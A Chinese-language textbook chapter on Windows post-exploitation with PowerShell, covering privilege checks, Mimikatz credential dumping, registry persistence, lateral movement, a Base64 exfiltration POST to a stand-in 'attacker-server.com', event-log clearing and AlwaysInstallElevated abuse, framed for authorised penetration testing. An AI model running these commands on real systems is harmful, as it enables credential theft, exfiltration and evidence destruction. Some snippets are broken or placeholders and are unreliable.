

# 第十五章：微软 Windows 中的后期利用

本章深入探讨了在微软 Windows 环境中使用 PowerShell 进行后期利用的强大领域。后期利用是一个关键阶段，攻击者的目标是在突破系统后维持控制、提升权限并提取有价值的信息。借助 PowerShell 的强大功能，我们将探索用于浏览 Windows 网络、操控权限和隐蔽活动的高级技术。从权限提升、横向移动到数据窃取和掩盖痕迹，PowerShell 作为一个多功能工具集，服务于防御者和攻击者。请与我们一起揭开后期利用的复杂性，展示如何策略性地使用 PowerShell 脚本模拟现实威胁，并加深对 Windows 安全环境的理解。通过详细的示例和实用的见解，本章将帮助你获得评估、防御并策略性应对微软 Windows 环境中后期利用阶段的知识。

本章将涵盖以下主要内容：

+   后期利用在微软 Windows 渗透测试中的作用

+   微软 Windows 中的后期利用

+   使用 PowerShell 在微软 Windows 中对用户进行分析

+   微软 Windows 中的文件权限

+   在微软 Windows 中使用 PowerShell 进行权限提升

# 后期利用在微软 Windows 渗透测试中的作用

后期利用是渗透测试中的关键阶段，尤其是在针对微软 Windows 环境时。此阶段发生在攻击者成功突破系统或网络、获得未经授权的访问权限后。后期利用的主要目标是保持控制、提升权限并收集有价值的信息，同时不触发检测机制。

微软 Windows 中后期利用的一个关键方面是理解操作系统的架构和安全机制。Windows 环境通常由多个相互连接的系统组成，这使得横向移动成为重点。攻击者的目标是穿越网络，提升权限以获得对更多资源的控制。

提升权限是后期利用中的常见目标。Windows 系统通常使用不同的用户账户，每个账户具有不同的权限。利用漏洞提升权限可以让攻击者访问敏感数据、安装恶意软件或操控系统配置。像 Mimikatz 这样的工具常常提取并利用存储在内存中的凭证，从而促进权限提升。

持久性维护是后期利用中的另一个关键方面。攻击者试图确保在初始利用后，仍能持续访问被攻破的系统。常用的技术包括后门、计划任务或注册表修改，用以建立持久性。这确保了即使最初的入口点被发现并修补，攻击者仍然可以重新获得访问权限。

数据外泄是后期利用中的一个重要问题。一旦进入网络，攻击者可能会针对敏感信息进行攻击，比如知识产权、客户数据或登录凭证。使用各种工具和技术，包括隐蔽通道和加密通信，攻击者能够在不引起怀疑的情况下外泄数据。

在后期利用过程中，安全专家必须模拟现实世界中的对手，以评估防御和事件响应能力的有效性。红队人员通常使用如 Cobalt Strike 或 Metasploit 等工具，模拟高级持续威胁，测试组织在检测和响应复杂攻击方面的能力。

后期利用还包括彻底的侦察。攻击者的目标是收集关于网络、架构以及不同系统和用户角色的信息。这些信息有助于做出关于进一步利用和横向渗透的明智决策。

总之，后期利用是针对微软 Windows 环境渗透测试的一个关键阶段。它涉及特权提升、持久性、数据外泄和侦察，以模拟现实世界的威胁，为组织的安全态势提供有价值的见解，并识别需要改进的领域。

# 微软 Windows 上的后期利用

PowerShell 是由微软开发的一种强大的脚本语言和 Shell，通常在后期利用活动中被用来在微软 Windows 平台上执行。它的灵活性、与 Windows 组件的集成以及执行命令和脚本的能力使其成为攻击者的首选工具。

还有一些框架支持后期利用。PowerShell Empire 是一个后期利用框架，提供一系列工具和模块，用于在 Windows 系统上执行后期利用活动。

以下是 PowerShell 在执行各种后期利用任务时的详细示例。

## 特权提升

可以使用 PowerShell 检查特权提升的机会。例如，以下 PowerShell 命令检查当前用户的权限：

```
 whoami /all
```

该命令显示当前用户的信息，包括其组成员身份和权限。

## 凭证转储

PowerShell 常被用于从内存中转储凭证。以下示例演示了使用`Mimikatz` PowerShell 模块，这是一款流行的凭证提取工具：

```
 # Load Mimikatz module
Import-Module .\mimikatz.ps1
# Run Mimikatz command to dump credentials
Invoke-Mimikatz -DumpCreds
```

该脚本导入`Mimikatz`模块并执行`Invoke-Mimikatz` cmdlet，从内存中提取凭据。

## 持久性

PowerShell 可以用来在被攻击的系统上建立持久性。例如，以下脚本会添加一个注册表项，在系统启动时执行 PowerShell 脚本：

```
 # Create a registry key for persistence
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyScript" -Value "powershell.exe -ExecutionPolicy Bypass -File C:\Path\To\MyScript.ps1"
```

该脚本创建一个注册表项，确保每次用户登录时都会执行 PowerShell 脚本。

## 横向移动

PowerShell 能够远程执行命令，这使得它在网络中进行横向移动时非常有价值。以下示例使用 PowerShell 远程执行命令：

```
 # Enable PowerShell remoting on the target machine
Enable-PSRemoting -Force
# Run a command on the remote machine
Invoke-Command -ComputerName TargetMachine -ScriptBlock { Get-Process }
```

在此示例中，目标机器上启用了 PowerShell 远程功能，然后执行一个命令（**Get-Process**）。需要注意的是，许多 cmdlet 都支持`-ComputeName`参数，这使得可以在远程系统上执行特定命令。

## 数据外泄

PowerShell 可以通过各种技术进行数据外泄。一个常见的方法是将数据编码为 Base64 并通过网络发送。以下脚本演示了这一过程：

```
 # Encode and send data to a remote server
$data = "SensitiveData"
$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
Invoke-WebRequest -Uri "http s://attac ker-server.com/upload.php" -Method POST -Body $encodedData
```

该脚本将`SensitiveData`字符串编码为 Base64，并将其发送到攻击者控制的服务器。

## 掩盖踪迹

PowerShell 还可以通过删除日志或修改事件条目来掩盖其踪迹。以下示例演示了如何删除事件日志：

```
 # Clear Windows event logs
Get-EventLog -LogName "Security" | ForEach-Object { Clear-EventLog -LogName $_.Log -Entry $_.Index -Force }
```

该脚本清除安全事件日志，删除活动痕迹。

总之，PowerShell 是一个功能强大的工具，适用于 Microsoft Windows 平台上的后渗透操作。它使攻击者能够提权、提取凭据、建立持久性、进行横向移动、外泄数据以及掩盖踪迹。防御者应该警惕监控 PowerShell 活动，并采取安全措施以缓解其误用带来的风险。

# 在 Microsoft Windows 上使用 PowerShell 进行用户分析

使用 PowerShell 在 Microsoft Windows 上进行用户分析，涉及收集用户的活动、权限和系统交互的详细信息。这个过程对于进行渗透测试的安全专家以及寻求利用漏洞的攻击者至关重要。以下是一些使用 PowerShell 在 Windows 系统上分析用户的示例。

## 用户信息

PowerShell 可以获取用户的详细信息，包括其账户属性和组成员资格。以下示例演示了如何收集用户信息：

```
 # Get information about the current user
Get-LocalUser -Name $env:USERNAME
# Get group memberships of the current user
Get-LocalGroupMember -Group "Users"
```

该脚本获取当前登录用户的信息，包括用户名、全名和组成员资格等属性。

## 正在运行的进程

用户分析涉及了解用户正在运行的进程。PowerShell 允许检索运行中的进程及其相关的详细信息：

```
 # Get a list of running processes for the current user
Get-Process -IncludeUserName
```

此命令提供有关进程的信息，包括与每个进程相关的用户名。

## 网络连接

分析包括检查用户建立的网络连接。可以使用 PowerShell 检索有关特定用户进程所有者的活动网络连接信息：

```
 # Get active network connections for the current user
Get-NetTCPConnection -OwningProcess (Get-Process -IncludeUserName | Where-Object { $_.UserName -eq $env:USERNAME }).Id
```

此脚本识别与当前用户拥有的进程相关的活动网络连接。

## 文件和目录访问

分析涉及了解用户的文件和目录访问情况。可以使用 PowerShell 列出用户具有访问权限的文件和目录：

```
 # List files/directories in the user's home directory
Get-ChildItem -Path $env:USERPROFILE
```

此命令列出用户主目录中的文件和目录。

## 已安装的软件

PowerShell 允许查询系统上已安装的软件，提供有关工具和应用程序的见解：

```
 # Get a list of installed software for the current user
Get-WmiObject -Query "SELECT * FROM Win32_Product WHERE Vendor = '$env:USERNAME'"
```

此命令检索与当前用户相关的已安装软件列表。

## 最近的活动

分析涉及了解用户的最近活动。PowerShell 可以查询事件日志以收集有关用户登录、系统更改以及其他相关事件的信息。在以下片段中，我们将重点关注用户登录和登出时的情况：

```
 # Get recent security events for the current user
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624 or EventID=4634) and EventData[Data[@Name='TargetUserName']='$env:USERNAME']]]" -MaxEvents 10
```

此脚本检索与当前用户相关的最近安全事件，如成功的登录和登出。

总结来说，使用 PowerShell 在微软 Windows 中分析用户涉及使用各种 cmdlet 和命令收集有关用户账户、运行进程、网络连接、文件访问、已安装软件和最近活动的信息。这种全面的方法帮助安全专业人员评估用户行为并识别潜在的安全风险。

# 微软 Windows 中的文件权限

在微软 Windows 中，文件权限在控制文件和文件夹访问、确保数据安全性和完整性方面起着至关重要的作用。理解如何管理和操作文件权限对系统管理员、安全专业人员和用户至关重要。以下部分将详细示范文件权限在 Windows 中的工作方式。

## 查看文件权限

PowerShell 可以查看文件或文件夹的现有文件权限。以下示例演示了如何检索文件的当前权限：

```
 # Get file permissions for a specific file
Get-Acl -Path "C:\Path\To\File.txt" | Format-List
```

此脚本使用 `Get-Acl` cmdlet 检索指定文件的 **访问控制列表**（**ACL**），然后格式化输出以提高可读性。

## 授予文件权限

PowerShell 使用户能够授予用户或组特定的权限。以下示例演示了如何授予特定用户读取和执行权限：

```
 # Grant read and execute permissions to a user
$user = "andrewblyth"
$file = "C:\Path\To\File.txt"
$permission = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "ReadAndExecute", "Allow")
(Get-Acl -Path $file).AddAccessRule($permission) | Set-Acl -Path $file
```

此脚本创建一个新的访问规则，指定用户、权限类型（**ReadAndExecute**）以及是否允许或拒绝该权限。然后将该规则添加到文件的 ACL。

## 修改文件权限

可以使用 PowerShell 修改现有的文件权限。以下示例演示了如何为现有用户添加写权限：

```
 # Add write permissions to an existing user
$user = "AndrewBlyth"
$file = "C:\Path\To\File.txt"
$acl = Get-Acl -Path $file
$acl.SetAccessRuleProtection($false, $false)
$permission = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "Write", "Allow")
$acl.AddAccessRule($permission) | Set-Acl -Path $file
```

该脚本检索当前的 ACL，禁用继承和保护，添加一个新的写入权限访问规则，然后将修改后的 ACL 应用到文件。

## 撤销文件权限

PowerShell 可用于撤销或删除文件权限。以下示例演示了如何从特定用户中删除读取权限：

```
 # Remove read permissions from a user
$user = "AndrewBlyth"
$file = "C:\Path\To\File.txt"
$acl = Get-Acl -Path $file
$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $user -and $_.FileSystemRights -eq "Read" }
$acl.RemoveAccessRule($rule) | Set-Acl -Path $file
```

在此脚本中，指定用户的现有访问规则及读取权限被识别并从 ACL 中删除。

在 Windows 中理解和有效管理文件权限对于维护安全且有序的文件系统至关重要。PowerShell 提供了一个强大且可脚本化的接口，可以高效地执行这些任务。

# 使用 PowerShell 在 Microsoft Windows 上进行权限提升

权限提升是渗透测试和安全评估中的关键方面。PowerShell 是 Windows 环境中的一种强大脚本语言，可以用于多种权限提升技术。以下是详细示例，展示了如何在 Microsoft Windows 上使用 PowerShell 进行权限提升。

## 检查当前用户的权限

在尝试权限提升之前，了解当前用户的权限至关重要。PowerShell 可用于检索有关当前用户的详细信息：

```
 # Check current user's privileges
whoami /all
```

该命令提供有关当前用户的广泛信息，包括组成员身份和权限。

## 枚举本地管理员

识别本地管理员是权限提升中的一个常见步骤。PowerShell 允许枚举本地管理员：

```
 # Get members of the Administrators group
Get-LocalGroupMember -Group "Administrators"
```

该命令列出了**管理员**组的成员，有助于识别具有提升权限的用户。

## 利用未加引号的服务路径

Windows 上的一些服务可能具有未加引号的路径，攻击者可以利用该路径操控服务执行路径，进而提升权限。PowerShell 可用于识别这些服务：

```
 # Check for unquoted service paths
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*\\*"' -and $_.StartMode -ne 'Disabled' }
```

该脚本识别具有未加引号路径的服务，这些服务可能被用于权限提升。

## 利用不安全的服务权限

在某些情况下，服务配置可能具有不安全的权限，允许非特权用户修改。PowerShell 可用于识别并利用这些错误配置：

```
 # Identify services with weak permissions
Get-Service | ForEach-Object {
    $service = $_
    $acl = (Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($service.ServiceName)")
    if ($acl.Access | Where-Object { $_.IdentityReference -eq "Users" -and $_.FileSystemRights -match "Write" }) {
        # Exploit weak permissions (replace with your payload)
        Write-Host "Service $($service.DisplayName) has weak permissions. Exploiting..."     }
}
```

该脚本检查注册表中服务的权限，并在发现任何可被利用的弱权限时发出警报。

## DLL 劫持

DLL 劫持涉及用恶意 DLL 替换合法 DLL，当进程加载该 DLL 时，可能导致权限提升。PowerShell 可用于识别潜在的 DLL 劫持机会：

```
 # Identify processes with DLL hijacking potential
Get-Process | ForEach-Object {
    $process = $_
    $dllPath = Join-Path $process.MainModule.FileName -ChildPath "evil.dll"
    if (-not (Test-Path $dllPath)) {
        # Exploit DLL hijacking (replace with your payload)
        Write-Host "Potential DLL hijacking found in $($process.ProcessName). Exploiting..."     }
}
```

该脚本检查每个运行的进程，寻找潜在的 DLL 劫持机会，并在发现时发出警报。我们还可以使用 `PowerSploit` 模块进行代码执行：

+   `Invoke-DllInjection`：将 DLL 注入到您选择的进程 ID 中

+   `Invoke-ReflectivePEInjection`：通过反射方式将 Windows PE 文件（DLL/EXE）加载到 PowerShell 进程中，或者通过反射方式将 DLL 注入到远程进程。

+   `Invoke-Shellcode`：将 shellcode 注入到你选择的进程 ID 中，或者在本地 PowerShell 中注入。

+   `Invoke-WmiCommand`：在目标计算机上执行 PowerShell 脚本块，并使用 WMI 作为 C2 通道返回格式化的输出。

## 注册表操作

PowerShell 可用于操作与用户权限相关的注册表设置。例如，修改 `AlwaysInstallElevated` 注册表键可能导致权限提升：

```
 # Modify the AlwaysInstallElevated registry key
$regPath = "HKCU:\Software\Policies\Microsoft\Windows\Installer"
$regName = "AlwaysInstallElevated"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name $regName -Value 1
```

该脚本创建所需的注册表路径并将 `AlwaysInstallElevated` 键设置为 `1`，这可能导致以提升权限安装包。

## 利用弱文件夹权限

弱文件夹权限可以被利用进行权限提升。PowerShell 可用于识别权限不安全的文件夹：

```
 # Identify folders with weak permissions
Get-ChildItem -Path C:\ -Recurse | Where-Object {
    $_.PSIsContainer -and (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -eq "Users" -and $_.FileSystemRights -match "Modify" }
}
```

该脚本会搜索权限较弱的文件夹（修改 `Users` 权限）并在找到时进行提醒。

## 利用计划任务

Windows 计划任务可用于进行权限提升。PowerShell 可用于识别和修改计划任务：

```
 # Identify scheduled tasks
Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "NT AUTHORITY\SYSTEM" } | ForEach-Object {
    # Exploit scheduled task (replace with your payload)
    Write-Host "Scheduled task $($_.TaskName) is running as SYSTEM. Exploiting..." }
```

该脚本识别以 `SYSTEM` 身份运行的计划任务，并在找到时发出警报，提供权限提升的机会。

## 利用无人值守安装

无人值守安装可能包含敏感信息，如未加密的密码文件。PowerShell 可用于搜索此类文件：

```
 # Search for unattended installation files
Get-ChildItem -Path C:\ -Recurse -Filter "unattend.xml" -File | ForEach-Object {
    # Exploit unattended installation file (replace with your payload)
    Write-Host "Unattended installation file found at $($_.FullName). Exploiting..." }
```

该脚本递归搜索 `unattend.xml` 文件，并在找到可能包含敏感信息的文件时发出警报。

这些示例展示了如何在 Microsoft Windows 系统中使用 PowerShell 进行权限提升。然而，需要注意的是，这些技术应仅在合法授权的环境下用于道德黑客或渗透测试。未经授权的权限提升尝试是非法的，可能会导致严重后果。安全专家和管理员应积极监控和保护系统，防止漏洞和未经授权的访问。

# 总结

在本章中，我们探讨了在微软 Windows 中使用 PowerShell 进行后渗透的动态环境。强调了这一阶段在安全评估中的重要性，我们深入分析了权限提升、横向移动和数据外泄技术，所有这些都依赖于 PowerShell 脚本的多功能性。从揭示弱权限和利用服务配置到操控注册表和掩盖痕迹，PowerShell 作为道德黑客和防御者的核心工具显现出来。本章提供了 PowerShell 如何促进复杂的后渗透操作的全面概述，使用户能够模拟和理解现实世界的威胁。通过详细的示例，本章使读者具备评估和强化 Windows 安全的能力，确保全面理解后渗透动态以及 PowerShell 在复杂 Windows 环境中导航和保护的作用。

在下一章中，我们将探索 PowerShell 与 Linux 在后渗透领域的强大协同作用。
